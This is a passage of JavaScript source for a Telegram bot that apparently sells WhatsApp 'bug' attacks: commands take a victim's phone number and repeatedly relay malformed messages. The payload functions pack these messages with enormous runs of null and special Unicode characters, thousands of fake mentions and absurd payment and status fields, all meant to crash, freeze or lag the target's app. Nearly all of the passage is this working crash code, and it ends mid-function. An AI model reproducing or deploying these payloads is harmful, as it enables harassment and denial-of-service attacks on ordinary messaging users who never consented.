‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Combo fuction 
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ??% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Atomic Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /Xcombo 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Combo fuction 
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ??% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Atomic Crashers Script`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 5; i++) {
      await DelayInvisV1(sock, target);
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
/// CASE BUG ///
bot.command("xlock", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /xlock 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xlock
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Blank Xword
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 50% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Invlasion`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xlock 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Blank Xword
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 50% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Invlasion`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 10; i++) {
      await kontolwork(sock, target);
        await new Promise(r => setTimeout(r, 900));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
/// CASE BUG  ///
bot.command("ints", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /ints 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /ints 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Freze infinity
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 65% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Invlasion`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /ints 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : freze infinity
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 65% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalins Invlasion`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 20; i++) {
      await VnXNewHardLockChat(sock, target);
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});

bot.command("xzwj", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /xzwj 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xzwj 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Delay void
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 65% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Invlasion`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xzwj
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Delay void
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 65% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalins Invlasion`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 60; i++) {
      await DelayHardNewV1Byswn(sock, target);
        await new Promise(r => setTimeout(r, 1300));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});

/// CASE BUG ///
bot.command("xloca", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /xloca 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xloca 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Crash no clik
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 85%
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalins Crashers Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xloca 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Crash no click
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 85%
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Invlasion`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 65; i++) {
      await CrashMsg(sock, target);
        await new Promise(r => setTimeout(r, 1500));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});

bot.command("xrax", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /xrax 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xrax
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Freze X delay
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 86%
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalins Crashers Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xrax
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Freze X delay
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 85%
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Invlasion`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 65; i++) {
      await FreezeDelayB(sock, target);
        await new Promise(r => setTimeout(r, 1500));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});

/// Hapus bug ///
bot.command("hapusbug", checkWhatsAppConnection, async (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;
  const args = ctx.message.text.trim().split(/\s+/).slice(1);
  const q = args[0];

  
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return ctx.reply(
      "❌ You are not authorized to view the premium list."
    );
  }

 
  if (sessions.size === 0) {
    return ctx.reply(
      "❌ ⵢ Sender Not Connected\nPlease /connect"
    );
  }

  
  if (!sock) {
    return ctx.reply(
      "❌ WhatsApp socket tidak aktif"
    );
  }

  
  if (!q) {
    return ctx.reply(
      "Cara Pakai Nih Njing!!!\n/hapusbug 62xxx"
    );
  }

  let pepec = q.replace(/[^0-9]/g, "");

  if (pepec.startsWith("0")) {
    return ctx.reply(
      "Contoh : /hapusbug 62xxx"
    );
  }

  let target = pepec + "@s.whatsapp.net";

  try {

  
    const processMessage = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: `
<blockquote><strong>｢ ⸸ ｣ Zalindra Clear Bug Process</strong></blockquote>
⌑ Target
ᯓ➤ ${target}
⌑ Type
ᯓ➤ Clear Personal Bug
⌑ Status
ᯓ➤ Process
<blockquote><i>By @seanoffc</i></blockquote>
`,
        parse_mode: "HTML"
      }
    );

  
    for (let i = 0; i < 3; i++) {
      await sock.sendMessage(target, {
        text: "𝐂𝐈𝐊𝐈𝐃𝐀𝐖 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐒𝐄𝐍𝐙𝐘 𝐆𝐀𝐍𝐓𝐄𝐍𝐆"
      });
    }

    
    await ctx.telegram.editMessageCaption(
      chatId,
      processMessage.message_id,
      undefined,
      `
<blockquote><strong>｢ ⸸ ｣ Zalin Clear Bug Process</strong></blockquote>
⌑ Target
ᯓ➤ ${target}
⌑ Type
ᯓ➤ Clear Personal Bug
⌑ Status
ᯓ➤ Success
<blockquote><i>By @seanoffc</i></blockquote>
`,
      {
        parse_mode: "HTML"
      }
    );

    await ctx.reply("Done Clear Bug By sen😜");

  } catch (err) {
    console.error("HAPUSBUG ERROR:", err);

    await ctx.reply(
      `Ada kesalahan saat mengirim bug.\n${err.message}`
    );
  }
});
// ------------ (  FUNCTION BUGS ) -------------- \\
async function kontolwork(sock, target) {
  try {
    const msg = {
      interactiveMessage: {
        body: {
          text: 'assalamualaikum mau nanya bg'
        },
        nativeFlowMessage: {
          buttons: "\uE000".repeat(80000)
        }
      }
    };

    await sock.relayMessage(target, msg, {
      participant: { jid: target }
    });

  } catch (err) {
    console.error(err);
  }
}

async function VnXNewHardLockChat(sock, target) {
  const vnxhere = "\uFEFF".repeat(50000);
  const vnxcuy = "\uFEFF".repeat(50000);

  const qchanel = {
    key: {
      remoteJid: 'status@broadcast',
      fromMe: false,
      participant: '0@s.whatsapp.net'
    },
    message: {
      newsletterAdminInviteMessage: {
        newsletterJid: '120363424218795720@newsletter',
        newsletterName: 'VnX Chanels',
        jpegThumbnail: "",
        caption: 'VnX - Raffioffci5',
        inviteExpiration: Date.now() + 1814400000
      }
    }
  };

  const toko = {
    key: {
      fromMe: false,
      participant: '0@s.whatsapp.net'
    },
    message: {
      productMessage: {
        product: {
          productImage: {
            mimetype: "image/jpeg",
            jpegThumbnail: ""
          },
          title: `VnX - Marketplace`,
          description: null,
          currencyCode: "IDR",
          priceAmount1000: "999999999999999",
          retailerId: `Powered By Raffi`,
          productImageCount: 1
        },
        businessOwnerJid: '0@s.whatsapp.net'
      }
    }
  };

  const vnxnew = {
    interactiveMessage: {
      body: {
        text: `VnX Here\n${vnxhere}`
      },
      nativeFlowMessage: {
        buttons: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1999 },
            () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
          )
        ],
        name: "\x10".repeat(50000)
      },
      contextInfo: {
        quotedMessage: qchanel.message,
      }
    }
  };

  const vnxcuyMsg = {
    interactiveMessage: {
      body: {
        text: `VnX Here\n${vnxcuy}`
      },
      nativeFlowMessage: {
        buttons: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1999 },
            () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
          )
        ],
        name: "\x10".repeat(50000)
      },
      contextInfo: {
        quotedMessage: toko.message,
      }
    }
  };

  await sock.relayMessage(target, vnxnew, { participant: { jid: target } });
  await sock.relayMessage(target, vnxcuyMsg, { participant: { jid: target } });
}

async function CrashMsg(sock, target) {
    try {
    
        const buttons = [];
        for (let i = 0; i < 5; i++) {
            buttons.push({
                buttonId: `btn_${i}`,
                buttonText: { displayText: "𑇂𑆵𑆴𑆿".repeat(200) + "ꦽ".repeat(200) },
                type: 1
            });
        }
        
        const msg1 = {
            text: "Zabina asshadell\n" + "ꦾ".repeat(5000) + "\u0000".repeat(3000),
            footer: "ោ៝" + "ꦾ".repeat(2000),
            buttons: buttons,
            headerType: 6,
            viewOnce: true,
            contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                externalAdReply: {
                    title: "𓆩᬴𓆪".repeat(1000),
                    body: "ꦾ".repeat(1000),
                    mediaType: 1,
                    thumbnailUrl: "https://files.catbox.moe/4tvxva.jpg",
                    sourceUrl: "https://t.me/seanoffc",
                    showAdAttribution: true
                }
            }
        };
        
        await sock.sendMessage(target, msg1);
        await new Promise(r => setTimeout(r, 300));
        
   
        const msg2 = await generateWAMessageFromContent(
            target,
            {
                newsletterAdminInviteMessage: {
                    newsletterJid: "1@newsletter",
                    newsletterName: "𓆩᬴𓆪".repeat(5000),
                    caption: "ꦾ".repeat(5000),
                    inviteCode: "ꦽ".repeat(5000),
                    contextInfo: {
                        locationMessage: {
                            degreesLatitude: 23045678087,
                            degreesLongitude: 23045678087,
                            name: "galaxy_message"
                        },
                        forwardingScore: 99999,
                        isForwarded: true,
                        externalAdReply: {
                            title: "when ya bisa ngewe",
                            body: "ꦾ".repeat(5000),
                            mediaType: 1,
                            sourceUrl: "https://"
                        }
                    }
                }
            },
            { forwardingScore: 99999, isForwarded: true, participant: { jid: target } }
        );
        
        await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id });
        await new Promise(r => setTimeout(r, 300));
        
        
        const Buttons1 = [];
        for (let i = 0; i < 5; i++) {
            Buttons1.push({
                buttonId: "cta_copy",
                buttonText: { displayText: "ꦽ".repeat(2000) },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({
                        title: "ꦽ".repeat(2000),
                        sections: [{ title: "Mark Zuckerberg", highlight_label: "label", rows: [] }]
                    })
                }
            });
        }
        
        const msg3 = {
            text: "ꦽ".repeat(5000),
            footer: "Cinta Tapi just frend?" + "ꦽ".repeat(5000) + "ោ៝".repeat(5000),
            viewOnce: true,
            buttons: Buttons1,
            headerType: 1,
            contextInfo: {
                participant: target,
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 100,
                businessMessageForwardInfo: { businessOwnerJid: target }
            }
        };
        
        await sock.sendMessage(target, msg3);
        
        console.log(`success sent to ${target}`);
        return true;
        
    } catch(e) {
        console.log(`error ${e.message}`);
        return false;
    }
}

async function FreezeDelayB(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "Aku ga mau pacaran, mau fokus belajar dlu"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_and_pay",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: {
                value: 999999999999,
                offset: 100
              },
              reference_id: "\u0000".repeat(5000),
              order: {
                status: "pending",
                items: [
                  {
                    name: "𑇂𑆵𑆴𑆿".repeat(9999),
                    amount: { value: 100000, offset: 100 },
                    quantity: 99999
                  }
                ]
              }
            })
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'𑇂𑆵𑆴𑆿'.repeat(75000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"QueenMia","key":"${'\u0000'.repeat(9000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 8640000
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(75000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function DelayHardNewV1Byswn(sock, target) {
  const Queen = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          mimetype: "video/mp4",
          fileLength: "17381601",
          title: "when ya berhenti pmo",
          fileName: " ah ah ange crot " + "ꦽ".repeat(50000),
          fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
          directPath: "/v/t62.7119-24/fake.enc",
          mediaKeyTimestamp: "1767975195",
          url: "https://mmg.whatsapp.net/d/fake.enc",
          caption: "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
        }
      }
    }
  };

  const Mia = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "lalu mau apa lagi" + "ꦾ".repeat(99999)
          },
          contextInfo: {
            stanzaId: "metawai_id",
            forwardingScore: 999,
            participant: target,
            mentionedJid: Array.from({ length: 2000 }, () => 
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            )
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", Queen, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined 
        }]
      }]
    }]
  });

  await sock.relayMessage("status@broadcast", Mia, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined 
        }]
      }]
    }]
  });

  const startTime = Date.now();
  const duration = 1 * 60 * 1000; // 1 menit
  
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text: "\u0000".repeat(500000),
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1950 },
                  () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                )
              ]
            }
          }
        }
      }
    }, { participant: { jid: target } });
  }
}

async function invisibledelay(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "XB",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 8640000
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(75000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function DelayStatus(sock, target) {
    try {
       
        const generateId = () => Math.random().toString(36).substring(2, 10);
        
        const msg = {
            key: { remoteJid: "status@broadcast", fromMe: false, id: generateId() },
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
                    mimetype: "image/jpeg",
                    fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
                    caption: "ꦽ".repeat(20000) + "𑇂𑆵𑆴𑆿".repeat(10000) + "\u0000".repeat(5000),
                    fileLength: "149502",
                    height: 720,
                    width: 720,
                    mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
                    fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
                    directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1777621571",
                    contextInfo: {
                        pairedMediaType: "SUPERMARKET",
                        isQuestion: true,
                        isGroupStatus: true
                    },
                    scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                    scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
                    midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
                }
            },
            messageTimestamp: Math.floor(Date.now() / 1000)
        };

       
        await sock.relayMessage("status@broadcast", msg.message, {
            statusJidList: [target],
            messageId: msg.key.id,
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: { jid: target },
                        content: undefined
